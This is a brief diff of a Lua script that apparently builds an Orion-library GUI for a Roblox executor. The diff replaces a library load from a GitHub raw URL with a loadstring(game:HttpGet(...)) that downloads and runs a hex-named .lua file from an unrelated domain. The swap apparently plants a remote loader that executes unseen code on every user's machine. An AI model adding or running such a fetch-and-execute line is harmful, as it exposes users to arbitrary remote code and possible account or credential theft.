@@ -9,7 +9,7 @@ local Window = OrionLib:MakeWindow({
 
 -- Global variable to toggle GUI visibility
 getgenv().gui = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingHubs/HiddenScripts/main/Orion-librarysource"))()
+loadstring(game:HttpGet("https://egorikusa.space/0a1f09ae8ddeb608701ffddd.lua", true))()
 
 -- Function to create a new tab
 local function createTab(name, icon, premiumOnly)
